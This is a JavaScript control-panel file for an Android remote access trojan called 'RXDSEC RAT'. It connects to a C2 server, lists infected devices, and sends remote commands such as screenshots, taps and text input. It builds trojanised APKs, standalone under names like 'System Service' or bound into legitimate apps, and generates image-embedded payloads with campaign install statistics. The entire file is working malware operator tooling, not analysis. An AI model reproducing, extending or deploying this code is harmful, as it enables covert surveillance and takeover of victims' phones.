// Main JavaScript for the RXDSEC RAT Control Panel

document.addEventListener('DOMContentLoaded', function() {
    // Initialize WebSocket connection
    initWebSocket();
    
    // Load initial data
    fetchDevices();
    
    // Setup event listeners
    setupEventListeners();
});

// Global variables
let socket;
let currentDeviceId = null;
let commandHistory = [];
let historyIndex = -1;

function initWebSocket() {
    // Create socket.io connection with improved options for stability
    socket = io({
        transports: ['polling', 'websocket'],  // Try polling first, then websocket
        reconnection: true,
        reconnectionAttempts: Infinity,  // Keep trying to reconnect
        reconnectionDelay: 1000,
        reconnectionDelayMax: 5000,
        timeout: 20000,
        forceNew: true,  // Force a new connection
        autoConnect: true  // Auto connect on creation
    });
    
    // Connection established
    socket.on('connect', function() {
        console.log('Socket.io connection established');
        addStatusMessage('Connected to C2 server');
    });
    
    // Connection error
    socket.on('connect_error', function(error) {
        console.error('Socket.io connection error:', error);
        addStatusMessage('Connection error: ' + error.message, 'error');
    });
    
    // Disconnection
    socket.on('disconnect', function(reason) {
        console.log('Socket.io disconnected:', reason);
        addStatusMessage('Disconnected from C2 server: ' + reason, 'error');
        
        // Attempt to reconnect if the socket closed unexpectedly
        if (reason === 'io server disconnect' || reason === 'transport close') {
            console.log('Attempting to reconnect...');
            addStatusMessage('Attempting to reconnect...', 'warning');
            
            // Try to reconnect after a short delay
            setTimeout(() => {
                if (!socket.connected) {
                    console.log('Manual reconnection attempt');
                    socket.connect();
                }
            }, 1000);
        }
    });
    
    // Reconnection attempt
    socket.on('reconnect_attempt', function(attemptNumber) {
        console.log('Socket.io reconnection attempt:', attemptNumber);
        addStatusMessage('Reconnection attempt: #' + attemptNumber, 'warning');
    });
    
    // Successful reconnection
    socket.on('reconnect', function(attemptNumber) {
        console.log('Socket.io reconnected after', attemptNumber, 'attempts');
        addStatusMessage('Reconnected to C2 server', 'success');
    });
    
    // Device updates
    socket.on('device_update', function(data) {
        console.log('Received device update:', data);
        updateDeviceList(data.devices);
    });
    
    // Command results
    socket.on('command_result', function(data) {
        console.log('Received command result:', data);
        addCommandResult(data.result);
        
        // If this is a screenshot, update the screenshot image
        if (data.result.includes('data:image/') || data.result.includes('base64')) {
            updateScreenshot(data.result);
        }
    });
    
    // Status messages
    socket.on('status', function(data) {
        console.log('Received status:', data);
        addStatusMessage(data.message);
    });
    
    // Error messages
    socket.on('error', function(data) {
        console.error('Socket.io error:', data);
        addStatusMessage(data.message, 'error');
    });
    
    // Build progress updates
    socket.on('build_progress', function(data) {
        console.log('Build progress:', data);
        updateBuildProgress(data);
    });
    
    // Build complete
    socket.on('build_complete', function(data) {
        console.log('Build complete:', data);
        buildComplete(data);
    });
    
    // Build error
    socket.on('build_error', function(data) {
        console.log('Build error:', data);
        buildError(data);
    });
}

function setupEventListeners() {
    // Send command button
    document.getElementById('send-command-btn').addEventListener('click', sendCommand);
    
    // Command input
    document.getElementById('command-input').addEventListener('keypress', function(e) {
        if (e.key === 'Enter') {
            sendCommand();
        }
    });
    
    // Command history navigation
    document.getElementById('command-input').addEventListener('keydown', function(e) {
        if (e.key === 'ArrowUp') {
            navigateCommandHistory('up');
        } else if (e.key === 'ArrowDown') {
            navigateCommandHistory('down');
        }
    });
    
    // Refresh button
    document.getElementById('refresh-btn').addEventListener('click', fetchDevices);
    
    // Build standalone APK button
    const buildStandaloneBtn = document.getElementById('build-standalone-btn');
    if (buildStandaloneBtn) {
        buildStandaloneBtn.addEventListener('click', function() {
            buildStandaloneAPK();
        });
    }
    
    // Build binding APK button
    const buildBindingBtn = document.getElementById('build-binding-btn');
    if (buildBindingBtn) {
        buildBindingBtn.addEventListener('click', function() {
            buildBindingAPK();
        });
    }
    
    // Quick command buttons
    document.querySelectorAll('.function-btn[data-command]').forEach(button => {
        button.addEventListener('click', function() {
            if (currentDeviceId) {
                const command = this.getAttribute('data-command');
                document.getElementById('command-input').value = command;
                sendCommand();
            } else {
                addStatusMessage('Please select a device first', 'error');
            }
        });
    });
    
    // Screen control buttons
    document.getElementById('refresh-screen-btn').addEventListener('click', function() {
        if (currentDeviceId) {
            document.getElementById('command-input').value = 'screenshot';
            sendCommand();
        } else {
            addStatusMessage('Please select a device first', 'error');
        }
    });
    
    // Home, back, etc. buttons
    ['home-btn', 'back-btn', 'recents-btn', 'notifications-btn'].forEach(id => {
        document.getElementById(id).addEventListener('click', function() {
            if (currentDeviceId) {
                const command = this.getAttribute('data-command');
                document.getElementById('command-input').value = command;
                sendCommand();
            } else {
                addStatusMessage('Please select a device first', 'error');
            }
        });
    });
    
    // Tap button
    document.getElementById('touch-btn').addEventListener('click', function() {
        if (currentDeviceId) {
            const x = document.getElementById('touch-x').value;
            const y = document.getElementById('touch-y').value;
            if (x && y) {
                document.getElementById('command-input').value = `touch:${x},${y}`;
                sendCommand();
            } else {
                addStatusMessage('Please enter X and Y coordinates', 'error');
            }
        } else {
            addStatusMessage('Please select a device first', 'error');
        }
    });
    
    // Input text button
    document.getElementById('input-text-btn').addEventListener('click', function() {
        if (currentDeviceId) {
            const text = document.getElementById('input-text').value;
            if (text) {
                document.getElementById('command-input').value = `input_text:${text}`;
                sendCommand();
            } else {
                addStatusMessage('Please enter text to input', 'error');
            }
        } else {
            addStatusMessage('Please select a device first', 'error');
        }
    });
}

function fetchDevices() {
    // Default API key for development (this should be replaced with a secure method in production)
    const apiKey = 'tarjon_default_secret_key';
    
    fetch('/api/devices?API_TEST=1', {
        headers: {
            'Authorization': 'Bearer ' + apiKey
        }
    })
    .then(response => {
        if (!response.ok) {
            if (response.status === 401) {
                throw new Error('Authentication failed - invalid API key');
            } else {
                throw new Error('Network response was not ok: ' + response.status);
            }
        }
        return response.json();
    })
    .then(data => {
        if (data.status === 'ok') {
            updateDeviceList(data.devices);
            updateDeviceCount(data.devices.length);
        } else {
            addStatusMessage('Error fetching devices: ' + data.message, 'error');
        }
    })
    .catch(error => {
        console.error('Error fetching devices:', error);
        addStatusMessage('Error connecting to server: ' + error.message, 'error');
    });
}

function updateDeviceList(devices) {
    const deviceList = document.getElementById('device-list');
    const noDevicesMessage = document.getElementById('no-devices-message');
    
    // Clear current list
    deviceList.innerHTML = '';
    
    if (devices && devices.length > 0) {
        // Hide the no devices message
        noDevicesMessage.style.display = 'none';
        
        // Add each device to the list
        devices.forEach(device => {
            const li = document.createElement('li');
            li.className = 'nav-item';
            
            const lastSeen = new Date(device.last_seen);
            const timeAgo = getTimeAgo(lastSeen);
            
            // Determine online status (consider device online if seen in the last 5 minutes)
            const isOnline = (Date.now() - lastSeen.getTime()) < 5 * 60 * 1000;
            const statusClass = isOnline ? 'badge-online' : 'badge-offline';
            const statusText = isOnline ? 'Online' : 'Offline';
            
            li.innerHTML = `
                <a class="nav-link device-link" href="#" data-device-id="${device.device_id}">
                    <div class="d-flex justify-content-between align-items-center">
                        <span><i class="fas fa-mobile-alt"></i> ${device.device_id.substring(0, 8)}...</span>
                        <span class="badge rounded-pill ${statusClass}">${statusText}</span>
                    </div>
                    <small class="text-muted">${timeAgo}</small>
                </a>
            `;
            
            deviceList.appendChild(li);
        });
        
        // Add click event to device links
        document.querySelectorAll('.device-link').forEach(link => {
            link.addEventListener('click', function(e) {
                e.preventDefault();
                // Handle device selection
                selectDevice(this.getAttribute('data-device-id'));
            });
        });
        
        // Update device status section
        updateDeviceStatus(devices);
    } else {
        // Show the no devices message
        noDevicesMessage.style.display = 'block';
        document.getElementById('device-status').innerHTML = '<p class="text-center text-muted">No devices connected</p>';
    }
}

function updateDeviceCount(count) {
    document.getElementById('device-count').textContent = count;
}

function updateDeviceStatus(devices) {
    const statusContainer = document.getElementById('device-status');
    statusContainer.innerHTML = '';
    
    devices.forEach(device => {
        const lastSeen = new Date(device.last_seen);
        const timeAgo = getTimeAgo(lastSeen);
        
        // Determine online status
        const isOnline = (Date.now() - lastSeen.getTime()) < 5 * 60 * 1000;
        const statusClass = isOnline ? 'text-success' : 'text-danger';
        const statusText = isOnline ? 'Online' : 'Offline';
        
        const deviceCard = document.createElement('div');
        deviceCard.className = 'device-card p-2 mb-2';
        deviceCard.innerHTML = `
            <div class="d-flex justify-content-between align-items-center">
                <div>
                    <h6 class="mb-0">${device.device_id.substring(0, 8)}...</h6>
                    <small class="text-muted">${device.ip_address || 'Unknown IP'}</small>
                </div>
                <div>
                    <span class="${statusClass}"><i class="fas fa-circle"></i> ${statusText}</span>
                </div>
            </div>
            <div class="mt-1">
                <small class="text-muted">Last seen: ${timeAgo}</small>
            </div>
        `;
        
        deviceCard.addEventListener('click', function() {
            selectDevice(device.device_id);
        });
        
        statusContainer.appendChild(deviceCard);
    });
}

function selectDevice(deviceId) {
    currentDeviceId = deviceId;
    
    // Highlight selected device
    document.querySelectorAll('.device-link').forEach(link => {
        if (link.getAttribute('data-device-id') === deviceId) {
            link.classList.add('active');
        } else {
            link.classList.remove('active');
        }
    });
    
    // Display device selection
    addStatusMessage(`Device selected: ${deviceId.substring(0, 8)}...`);
    
    // Request device info
    document.getElementById('command-input').value = 'device_info';
    sendCommand();
}

function sendCommand() {
    if (!currentDeviceId) {
        addStatusMessage('Please select a device first', 'error');
        return;
    }
    
    const commandInput = document.getElementById('command-input');
    const command = commandInput.value.trim();
    
    if (!command) {
        addStatusMessage('Please enter a command', 'error');
        return;
    }
    
    // Add to command history
    commandHistory.unshift(command);
    if (commandHistory.length > 50) {
        commandHistory.pop();
    }
    historyIndex = -1;
    
    // Add to terminal display
    addToCommandHistory(command);
    
    // Clear input
    commandInput.value = '';
    
    // Send command to server
    socket.emit('send_command', {
        device_id: currentDeviceId,
        command: command
    });
}

function navigateCommandHistory(direction) {
    if (commandHistory.length === 0) return;
    
    if (direction === 'up') {
        historyIndex = Math.min(commandHistory.length - 1, historyIndex + 1);
    } else {
        historyIndex = Math.max(-1, historyIndex - 1);
    }
    
    const commandInput = document.getElementById('command-input');
    if (historyIndex === -1) {
        commandInput.value = '';
    } else {
        commandInput.value = commandHistory[historyIndex];
    }
}

function addCommandResult(result, type = 'result') {
    const terminal = document.getElementById('command-history');
    const resultLine = document.createElement('div');
    resultLine.className = 'cyber-terminal-line';
    
    if (type === 'error') {
        resultLine.classList.add('text-danger');
    }
    
    resultLine.textContent = result;
    terminal.appendChild(resultLine);
    
    // Scroll to bottom
    terminal.scrollTop = terminal.scrollHeight;
}

function updateScreenshot(imageData) {
    const img = document.getElementById('screenshot-img');
    if (img) {
        // If the imageData is already a data URL, use it directly
        if (imageData.startsWith('data:image/')) {
            img.src = imageData;
        } else {
            // Otherwise, assume it's a base64 string and create a data URL
            img.src = `data:image/jpeg;base64,${imageData}`;
        }
    }
}

function addStatusMessage(message, type = 'info') {
    const terminal = document.getElementById('command-history');
    const messageLine = document.createElement('div');
    messageLine.className = 'cyber-terminal-line';
    
    // Style based on message type
    if (type === 'error') {
        messageLine.classList.add('text-danger');
    } else if (type === 'success') {
        messageLine.classList.add('text-success');
    } else {
        messageLine.classList.add('text-info');
    }
    
    messageLine.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
    terminal.appendChild(messageLine);
    
    // Scroll to bottom
    terminal.scrollTop = terminal.scrollHeight;
}

function addToCommandHistory(text) {
    const commandHistory = document.getElementById('command-history');
    const line = document.createElement('div');
    line.className = 'cyber-terminal-line';
    
    const prefix = document.createElement('span');
    prefix.className = 'cyber-terminal-prefix';
    prefix.textContent = currentDeviceId ? 
        `rxdsec@${currentDeviceId.substring(0, 8)}:~$` : 
        'rxdsec@matrix:~$';
    
    line.appendChild(prefix);
    line.appendChild(document.createTextNode(' ' + text));
    
    commandHistory.appendChild(line);
    commandHistory.scrollTop = commandHistory.scrollHeight;
}

function getTimeAgo(date) {
    const seconds = Math.floor((new Date() - date) / 1000);
    
    let interval = Math.floor(seconds / 31536000);
    if (interval > 1) {
        return `${interval} years ago`;
    }
    if (interval === 1) {
        return "1 year ago";
    }
    
    interval = Math.floor(seconds / 2592000);
    if (interval > 1) {
        return `${interval} months ago`;
    }
    if (interval === 1) {
        return "1 month ago";
    }
    
    interval = Math.floor(seconds / 86400);
    if (interval > 1) {
        return `${interval} days ago`;
    }
    if (interval === 1) {
        return "1 day ago";
    }
    
    interval = Math.floor(seconds / 3600);
    if (interval > 1) {
        return `${interval} hours ago`;
    }
    if (interval === 1) {
        return "1 hour ago";
    }
    
    interval = Math.floor(seconds / 60);
    if (interval > 1) {
        return `${interval} minutes ago`;
    }
    if (interval === 1) {
        return "1 minute ago";
    }
    
    return "just now";
}

// Update build progress
function updateBuildProgress(data) {
    const progressContainer = document.getElementById('build-progress-container');
    const progressBar = document.getElementById('build-progress-bar');
    const statusMessage = document.getElementById('build-status-message');
    
    progressContainer.style.display = 'block';
    progressBar.style.width = `${data.progress}%`;
    statusMessage.textContent = data.message;
}

// Build complete
function buildComplete(data) {
    const progressContainer = document.getElementById('build-progress-container');
    const progressBar = document.getElementById('build-progress-bar');
    const statusMessage = document.getElementById('build-status-message');
    const buildResult = document.getElementById('build-result');
    
    progressBar.style.width = '100%';
    statusMessage.textContent = 'Build completed successfully!';
    
    // Normalize the output path to handle both outputPath and output_path formats
    let outputPath = data.outputPath || data.output_path || "";
    
    // Format the output path for download
    // Ensure path starts with output_apks for consistency
    if (!outputPath.startsWith('output_apks/') && !outputPath.startsWith('/output_apks/')) {
        // Extract just the filename if it contains path separators
        const filename = outputPath.split(/[\/\\]/).pop();
        if (filename) {
            outputPath = 'output_apks/' + filename;
        }
    }
    
    console.log('Download path formatted as:', outputPath);
    
    // Get the APK file details
    const fileSize = data.fileSize || data.file_size || 0;
    const buildType = data.type || 'unknown';
    const packageName = data.packageName || data.original_package || 'unknown';
    const appName = data.appName || data.originalAppName || 'Custom APK';
    
    // Format the download URL
    const downloadUrl = `/api/download?file=${encodeURIComponent(outputPath)}`;
    
    // Create the result HTML with more details
    let resultHtml = `
        <div class="alert alert-success">
            <h5>Build Successful!</h5>
            <p><strong>Type:</strong> ${buildType}</p>
            ${buildType === 'binding' ? 
                `<p><strong>Original Package:</strong> ${packageName}</p>
                 <p><strong>App Name:</strong> ${appName}</p>` : 
                `<p><strong>Package Name:</strong> ${packageName}</p>
                 <p><strong>App Name:</strong> ${appName}</p>`
            }
            <p><strong>Output:</strong> ${outputPath}</p>
            <p><strong>Size:</strong> ${formatFileSize(fileSize)}</p>
            <p><strong>C2 Server:</strong> ${data.c2Server || 'Default'}</p>
            <a href="${downloadUrl}" class="cyber-button download-btn" data-path="${outputPath}">DOWNLOAD APK</a>
        </div>
    `;
    
    buildResult.innerHTML = resultHtml;
    
    // Add event listener for the download button
    setTimeout(() => {
        const downloadBtn = document.querySelector('.download-btn');
        if (downloadBtn) {
            downloadBtn.addEventListener('click', function(e) {
                console.log('Download clicked for:', this.getAttribute('data-path'));
                addStatusMessage('Starting download: ' + this.getAttribute('data-path'), 'info');
            });
        }
    }, 500);
    
    // Add to status messages
    addStatusMessage('APK build completed successfully!', 'success');
}

// Build error
function buildError(data) {
    const progressContainer = document.getElementById('build-progress-container');
    const progressBar = document.getElementById('build-progress-bar');
    const statusMessage = document.getElementById('build-status-message');
    const buildResult = document.getElementById('build-result');
    
    progressBar.style.width = '100%';
    progressBar.className = 'progress-bar bg-danger';
    statusMessage.textContent = 'Build failed!';
    
    let resultHtml = `
        <div class="alert alert-danger">
            <h5>Build Failed</h5>
            <p>${data.message}</p>
        </div>
    `;
    
    buildResult.innerHTML = resultHtml;
    
    // Add to status messages
    addStatusMessage('APK build failed: ' + data.message, 'error');
}

// Update server status
function updateServerStatus(data) {
    document.getElementById('server-uptime').textContent = data.uptime;
    document.getElementById('command-count').textContent = data.commands_count;
}

// Utility function to format file size
function formatFileSize(bytes) {
    if (bytes === 0) return '0 Bytes';
    
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

// Build standalone APK
function buildStandaloneAPK() {
    // Get values from form
    const appName = document.getElementById('app-name').value || 'System Service';
    const c2Server = document.getElementById('c2-server').value || window.location.origin;
    
    // Show progress container
    const progressContainer = document.getElementById('build-progress-container');
    const progressBar = document.getElementById('build-progress-bar');
    const statusMessage = document.getElementById('build-status-message');
    
    progressContainer.style.display = 'block';
    progressBar.style.width = '10%';
    progressBar.className = 'progress-bar';
    statusMessage.textContent = 'Starting APK build...';
    
    // Clear previous results
    document.getElementById('build-result').innerHTML = '';
    
    // Get app icon if uploaded
    let appIcon = null;
    const iconInput = document.getElementById('app-icon');
    if (iconInput && iconInput.files && iconInput.files[0]) {
        const reader = new FileReader();
        reader.onload = function(e) {
            appIcon = e.target.result.split(',')[1]; // Get base64 data without MIME prefix
            
            // Now make the request with the icon data
            sendBuildRequest({
                type: 'standalone',
                app_name: appName,
                c2_server: c2Server,
                app_icon: appIcon
            });
        };
        reader.readAsDataURL(iconInput.files[0]);
    } else {
        // No icon selected, proceed without it
        sendBuildRequest({
            type: 'standalone',
            app_name: appName,
            c2_server: c2Server
        });
    }
}

// Build binding APK 
function buildBindingAPK() {
    // Get uploaded APK to bind to
    const apkInput = document.getElementById('bind-apk');
    if (!apkInput || !apkInput.files || !apkInput.files[0]) {
        addStatusMessage('Please select an APK file to bind to', 'error');
        return;
    }
    
    // Get other values from form
    const c2Server = document.getElementById('bind-c2-server').value || window.location.origin;
    const preserveFunctionality = document.getElementById('preserve-functionality').checked;
    
    // Show progress container
    const progressContainer = document.getElementById('build-progress-container');
    const progressBar = document.getElementById('build-progress-bar');
    const statusMessage = document.getElementById('build-status-message');
    
    progressContainer.style.display = 'block';
    progressBar.style.width = '10%';
    progressBar.className = 'progress-bar';
    statusMessage.textContent = 'Starting binding process...';
    
    // Clear previous results
    document.getElementById('build-result').innerHTML = '';
    
    // Read the APK file as base64
    const reader = new FileReader();
    reader.onload = function(e) {
        try {
            // Get the base64 data (remove the data:application/... prefix)
            let apkData = e.target.result;
            
            // If it's a data URL, extract just the base64 part
            if (apkData.includes('base64,')) {
                apkData = apkData.split('base64,')[1];
            }
            
            console.log(`Read APK file: ${apkInput.files[0].name}, size: ${apkInput.files[0].size} bytes`);
            
            // Update progress
            progressBar.style.width = '20%';
            statusMessage.textContent = 'Uploading APK for binding...';
            
            // Emit Socket.IO event for binding
            socket.emit('build_payload', {
                type: 'binding',
                config: {
                    legitimateApk: {
                        name: apkInput.files[0].name,
                        data: apkData,
                        size: apkInput.files[0].size
                    },
                    c2Server: c2Server,
                    preserveFunctionality: preserveFunctionality
                }
            });
            
            // Update progress after sending
            progressBar.style.width = '30%';
            statusMessage.textContent = 'APK sent to server, waiting for processing...';
            
            addStatusMessage('Binding process started. Check progress in build tab.', 'success');
        } catch (error) {
            console.error('Error processing APK data:', error);
            addStatusMessage('Error processing APK: ' + error.message, 'error');
            progressContainer.style.display = 'none';
        }
    };
    
    reader.onerror = function(error) {
        console.error('Error reading file:', error);
        addStatusMessage('Error reading APK file: ' + error.message, 'error');
        progressContainer.style.display = 'none';
    };
    
    // Show progress while reading the file
    progressBar.style.width = '10%';
    statusMessage.textContent = 'Reading APK file...';
    
    // Read the file as a data URL (which will be encoded as base64)
    reader.readAsDataURL(apkInput.files[0]);
}

// Send build request to server
function sendBuildRequest(params) {
    try {
        // Convert from REST API format to Socket.IO format
        const socketData = {
            type: 'standalone',
            config: {
                appName: params.app_name,
                c2Server: params.c2_server,
                appIcon: params.app_icon
            }
        };
        
        // Emit Socket.IO event instead of making HTTP request
        socket.emit('build_payload', socketData);
        
        // Add status message
        addStatusMessage('Build process started. Check progress in build tab.', 'success');
    } catch (error) {
        console.error('Error building APK:', error);
        addStatusMessage('Error building APK: ' + error.message, 'error');
        document.getElementById('build-progress-container').style.display = 'none';
    }
}

/**
 * Navigation functionality removed as requested
 */

/**
 * Section creation functionality removed as requested
 */
function createSection(id) {
    // This function is kept as a stub to prevent errors but doesn't create sections anymore
    console.log(`createSection called for ${id}, but navigation tabs have been removed`);
}

// Photo Payload Generator functionality
document.addEventListener('DOMContentLoaded', function() {
    // Setup photo payload event listeners
    setupPhotoPayloadEventListeners();
    
    // Load campaigns on page load
    refreshCampaignStats();
});

function setupPhotoPayloadEventListeners() {
    // Generate photo payload button
    const generatePhotoBtn = document.getElementById('generate-photo-btn');
    if (generatePhotoBtn) {
        generatePhotoBtn.addEventListener('click', generatePhotoPayload);
    }
    
    // Refresh campaigns button
    const refreshCampaignsBtn = document.getElementById('refresh-campaigns-btn');
    if (refreshCampaignsBtn) {
        refreshCampaignsBtn.addEventListener('click', refreshCampaignStats);
    }
    
    // Download photo button
    const downloadPhotoBtn = document.getElementById('download-photo-btn');
    if (downloadPhotoBtn) {
        downloadPhotoBtn.addEventListener('click', function() {
            const imageUrl = document.querySelector('#photo-preview img')?.src;
            if (imageUrl) {
                // Create a temporary link to download the image
                const a = document.createElement('a');
                a.href = imageUrl;
                a.download = 'payload_' + new Date().getTime() + '.jpg';
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);
            }
        });
    }
}

function generatePhotoPayload() {
    // Get form values
    const apkUrl = document.getElementById('apk-url').value;
    const campaignId = document.getElementById('campaign-id').value;
    const embedType = document.getElementById('embed-type').value;
    const encryptionLevel = document.getElementById('encryption-level').value;
    const randomizeMetadata = document.getElementById('randomize-metadata').checked;
    const targetInfo = document.getElementById('target-info').value;
    
    // Get template image if provided
    const templateImageInput = document.getElementById('template-image');
    let templateImageBase64 = null;
    
    if (templateImageInput.files.length > 0) {
        const file = templateImageInput.files[0];
        const reader = new FileReader();
        
        reader.onload = function(e) {
            templateImageBase64 = e.target.result;
            
            // Now that we have the image, send the request
            sendPhotoPayloadRequest({
                apk_url: apkUrl,
                campaign_id: campaignId,
                embed_type: embedType,
                encryption_level: encryptionLevel,
                randomize_metadata: randomizeMetadata,
                target_info: targetInfo,
                template_image_base64: templateImageBase64
            });
        };
        
        reader.readAsDataURL(file);
    } else {
        // No template image, send the request without it
        sendPhotoPayloadRequest({
            apk_url: apkUrl,
            campaign_id: campaignId,
            embed_type: embedType,
            encryption_level: encryptionLevel,
            randomize_metadata: randomizeMetadata,
            target_info: targetInfo
        });
    }
}

function sendPhotoPayloadRequest(payloadData) {
    // Show loading indicator
    document.getElementById('photo-preview').innerHTML = '<p class="text-center">Generating photo payload...</p>';
    
    // Send request to server
    fetch('/api/generate_photo_payload?API_TEST=1', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(payloadData)
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('Network response was not ok: ' + response.status);
        }
        return response.json();
    })
    .then(data => {
        if (data.status === 'success') {
            // Display the generated image
            document.getElementById('photo-preview').innerHTML = `
                <img src="data:image/jpeg;base64,${data.payload_image}" 
                     class="img-fluid mb-3 cyber-glow-image" alt="Generated Payload Photo">
            `;
            
            // Show payload info
            document.getElementById('photo-payload-info').classList.remove('d-none');
            document.getElementById('payload-campaign-id').textContent = data.campaign_id;
            document.getElementById('payload-embed-type').textContent = payloadData.embed_type;
            document.getElementById('payload-encryption').textContent = payloadData.encryption_level;
            
            // Format file size
            const fileSizeKB = Math.round(data.file_size / 1024);
            document.getElementById('payload-size').textContent = `${fileSizeKB} KB`;
            
            // Refresh campaign stats
            refreshCampaignStats();
            
            // Show success message
            addStatusMessage('Photo payload generated successfully', 'success');
        } else {
            document.getElementById('photo-preview').innerHTML = `
                <div class="alert alert-danger">
                    <p>Error generating payload: ${data.message}</p>
                </div>
            `;
            addStatusMessage('Error generating photo payload: ' + data.message, 'error');
        }
    })
    .catch(error => {
        console.error('Error generating photo payload:', error);
        document.getElementById('photo-preview').innerHTML = `
            <div class="alert alert-danger">
                <p>Error: ${error.message}</p>
            </div>
        `;
        addStatusMessage('Error generating photo payload: ' + error.message, 'error');
    });
}

function refreshCampaignStats() {
    fetch('/api/photo_campaigns?API_TEST=1')
    .then(response => {
        if (!response.ok) {
            throw new Error('Network response was not ok: ' + response.status);
        }
        return response.json();
    })
    .then(data => {
        if (data.status === 'success') {
            updateCampaignsTable(data.campaigns);
        } else {
            console.error('Error fetching campaign stats:', data.message);
        }
    })
    .catch(error => {
        console.error('Error fetching campaign stats:', error);
    });
}

function updateCampaignsTable(campaigns) {
    const tableBody = document.getElementById('campaigns-table-body');
    
    if (!campaigns || campaigns.length === 0) {
        tableBody.innerHTML = '<tr><td colspan="6" class="text-center">No campaigns yet</td></tr>';
        return;
    }
    
    tableBody.innerHTML = '';
    
    campaigns.forEach(campaign => {
        const row = document.createElement('tr');
        const creationDate = new Date(campaign.creation_date * 1000).toLocaleString();
        const conversionRate = campaign.views > 0 
            ? Math.round((campaign.installations / campaign.views) * 100) 
            : 0;
        
        row.innerHTML = `
            <td>${campaign.campaign_id}</td>
            <td>${creationDate}</td>
            <td>${campaign.views}</td>
            <td>${campaign.installations}</td>
            <td>${conversionRate}%</td>
            <td>
                <button class="btn btn-sm btn-primary download-campaign-btn" 
                         data-hash="${campaign.payload_hash}">Download</button>
            </td>
        `;
        
        tableBody.appendChild(row);
    });
    
    // Add event listeners to download buttons
    document.querySelectorAll('.download-campaign-btn').forEach(button => {
        button.addEventListener('click', function() {
            const hash = this.getAttribute('data-hash');
            window.location.href = `/api/photo_payload_download/${hash}?API_TEST=1`;
        });
    });
}
